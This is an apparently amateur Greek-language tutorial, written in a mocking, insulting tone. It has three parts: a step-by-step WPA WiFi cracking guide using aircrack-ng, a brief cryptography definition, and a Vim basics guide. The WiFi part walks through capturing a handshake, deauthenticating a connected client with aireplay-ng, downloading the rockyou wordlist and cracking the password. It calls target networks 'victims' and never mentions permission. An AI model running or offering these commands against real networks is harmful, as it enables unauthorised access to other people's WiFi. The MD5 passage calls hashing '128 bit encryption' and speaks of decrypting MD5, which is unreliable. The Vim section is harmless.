HACKING ΓΙΑ ΗΛΙΘΙΟΥΣ

Καλησπέρα ηλίθιε μου, κατέβασες το kali και τώρα δεν ξέρεις από που να ξεκινήσεις?
Καταρχήν κανε πάλι format, βάλε ένα αντρικό λειτουργικό σαν το gentoo και άσε τα κοριτσίστικα.
Εδώ θα μάθεις πως να χακαρεις ασύρματα δίκτυα, wifi κοινός.

Αρχικά θα χρειαστείς το πακέτο aircrack-ng
Τα πράματα ειναι πολύ απλά ακόμα και για σένα που δεν έχεις μάθει το vim και χρησιμοποιείς ακόμα το nano λες και είσαι 3 χρονών παιδάκι. Αλλά αφού κατέβασες το kali τι να περιμένει κανείς. Έχω γράψει και ένα οδηγό για το vim, αν ενδιαφέρεσαι ρώτα μαλακα.

Εντολή πρώτη
sudo airmon-ng
με αυτή βλέπεις την κάρτα δικτύου σου
τώρα πρέπει να την βάλουμε σε monitor mode

Εντολή δεύτερη
sudo airmon-ng start wlan0
οπου wlan0 η κάρτα δικτύου σου

Εντολή τρίτη με αυτή βλέπεις όλα τα διαθέσιμα θύματα σου
airodump-ng wlan0mon
με την ifconfig μπορείς να δεις ακριβώς το όνομα που έχει πλέον η κάρτα δικτύου σου
αυτά που θα χρειαστείς για την επόμενη εντολή είναι το channel και το BSSID καν τα copy κάπου

Εντολή τέταρτη τρέξε αυτό και άστο μέχρι να καταγράψει το handshake. Θα φανεί πάνω δεξιά όταν καταγραφεί
αντικατέστησε τα X με αυτά που σου είπα να κάνεις copy πριν
airodump-ng -c X --bssid XX:XX:XX:XX:XX:XX -w capture/ mon0

Εντολή πέμπτη άνοιξε άλλο terminal και τρέξε αυτή για να αποσυνδέσεις έναν από τους client που είναι συνδεδεμένοι επάνω στο router ώστε να αναγκάσεις την αποσυνδεδεμένη συσκευή να στείλει εν νέου handshake
στο -a την mac address του ρουτερ κάτω αριστερά και στο -c την mac address ενός client κάτω δεξιά στο προηγούμενο terminal που άφησες ανοιχτό
aireplay-ng -0 2 -a XX:XX:XX:XX:XX:XX -c XX:XX:XX:XX:XX:XX mon0

κατέβασε μια λίστα με πιθανούς κωδικούς για να σπάσεις το .-01.cap
curl -L -o rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
και με αυτή την τελευταία εντολή σταματάς πλέον να είσαι ηλίθιος και μπαίνεις στην κατηγορία τον άσχετων hacker
aircrack-ng -a2 -b XX:XX:XX:XX:XX:XX -w rockyou.txt .-01.cap

Αυτά, βαρέθηκα και πραγματικά δεν ξέρω γιατί ασχολούμαι ακόμα μαζί σου
Α και αν θες να γίνεις ακόμα μεγαλύτερος cracker ψάξε ΜΟΝΟΣ ΣΟΥ το hashcat είναι πολλά level πάνω από το aircrack-ng όσο αναφορά την ταχύτητα που τρέχει την wordlist γιατί χρησιμοποιεί GPU και έχει πολλές άλλες λειτουργίες.

Κρυπτογραφία

Κρυπτογραφία γενικότερα είναι η ανταλλαγή μηνυμάτων μεταξύ δύο μερών με τέτοιο τρόπο, ώστε η κατανόηση του περιεχομένου των μηνυμάτων να είναι δυνατή μόνο από τον αποστολέα και τον παραλήπτη.
Κρυπτογράφηση (encryption) ονομάζεται η διαδικασία μετασχηματισμού ενός μηνύματος σε μία ακατανόητη μορφή με τη χρήση κάποιου κρυπτογραφικού αλγορίθμου ούτως ώστε να μην μπορεί να διαβαστεί από κανέναν εκτός του νόμιμου παραλήπτη.
Η αντίστροφη διαδικασία όπου από το κρυπτογραφημένο κείμενο παράγεται το αρχικό μήνυμα ονομάζεται αποκρυπτογράφηση (decryption).

random-md5-generator

Ψάχνοντας να βρω κλειδιά μορφής MD5 για αποκρυπτογράφηση έφτιαξα αυτό το script το οποιο δημιουργεί τυχαίους αριθμούς και στην συνέχεια τους κωδικοποιεί με 128 bit encryption

Vim για ηλίθιους.

Καταρχήν να ξεκινήσουμε από το βασικο, πως βγαίνει ένας ηλίθιος από το vim.

Ηλίθιε πάτα πρώτα ESC πριν προσπαθήσεις οτιδήποτε από τα παρακατω.

1ο μέρος

:q η απλή έξοδος.
:q! Αν έχεις κάνει μαλακια και δεν θες να την σώσεις.
:wq Αν έχεις κάνει μαλακια και θες να την σώσεις παρόλα αυτά.
Ενας φίλος με διορθώνει ποιον εμένα τον παντογνώστη. Πού να κολλήσει ransomware και να μην του κάνει κανείς Bitcoin για να πληρώσει τα λιτρα.
:x είναι πιο γρήγορο από :wq

:w αν θες να σώσεις την μαλακια που έγραψες χωρίς να βγεις. (Επειδή μάλλον νιώθεις πολύ περιφανος για αυτη)

Πώς ψάχνει ένας ηλίθιος στο vim: (όχι ότι χρειάζεται βοήθεια για να ψάξει τις 2 γραμμές κώδικα που έγραψε, αλλά λέμε τωρα.)

/Την λέξη που ψάχνει
π.χ.
/bullshit
n για να πας στην επόμενη ίδια λέξη

Για να πας στην αρχή του κειμένου που έχεις γράψει πατάς
gg

ή απλά πατάς μια φορά το βελάκι προς τα πάνω, αφού 2 γραμμές έχεις γράψει έτσι κ αλλιώς ηλίθιε.

Για να πας στο τέλος του κειμένου πατάς
Shift g

Αν θες τώρα να πας σε μια συγκεκριμένη γραμμή από τις 2 που έγραψες πατάς
:2
Και πας στην 2ρη. Νταα νταα

Αν θες να βλέπεις τα νούμερα των γραμμών σου γιατί μπορεί να μπερδεύεις την πρώτη με τη δεύτερη πατάς
:set number

Μέρος 2ο

Εδώ ηλίθιε θα μάθεις πως να γραφεις περισσότερες μαλακίες με το vim.

Καταρχήν για να μπορείς να γράψεις την πρώτη σου λέξη πάτα το κουμπί
insert ή το i
Στο πληκτρολόγιο λέω, εκεί κάπου πάνω από το delete είναι, το βρήκες ή είσαι και τυφλός?

Τώρα μπορείς να γράφεις όσες μαλακίες θες άφοβα αρκεί να μην τις ποσταρις σε κάνα GitHub και τις βλέπει ο κόσμος.
ΑΝ ΘΕΣ ΝΑ ΣΩΣΕΙΣ ΠΑΤΑΣ ΠΡΩΤΑ ESC πάνω αριστερά στο πληκτρολόγιο. Γενικά να ξέρεις με το vim το ένα χέρι το έχεις στο ESC και με το άλλο γράφεις (το αριστερο. Αν σε βολεύει το δεξί μάλλον έχεις ανάποδα το πληκτρολόγιο).

COPY PASTE DELETE σε γραμμές

Εάν έχεις γράψει μια ολόκληρη γραμμή και είσαι τόσο περιφανος και θες να την αντιγράψεις πατάς

yy για να κάνεις αντιγραφή της γραμμής

Και πας τον κέρσορα μια γραμμή πάνω από αυτή που θες να την ποσταρις και πατάς

p τώρα μπορείς να αντιγράφεις κιόλας τις μαλακίες που γράφεις

dd διαγράφει σειρές (όχι σειρές του Netflix. Δεν έχουν βρει ακόμα τρόπο να το κάνουν αυτό) αν τελικά καταλάβεις ότι γράφεις μαλακίες το dd είναι αυτό που θα σε σώσει (και τον υπόλοιπο πλανήτη).

Αυτά βαρέθηκα να ασχολούμαι, καλή τύχη. Θα σου χρειαστεί γιατί δεν έχω ιδέα τι γράφω.

Αν σας αρέσει και δεν μου το κόψει κανας μαλακας admin θα συνεχίσω. Αυτά για την ωρα. Με πολύ αγάπη για τους νέους φίλους του Linux (και τους παλιούς που ΑΚΟΜΑ ΔΕΝ ΕΜΑΘΑΝ πως να βγαίνουν από το vim).
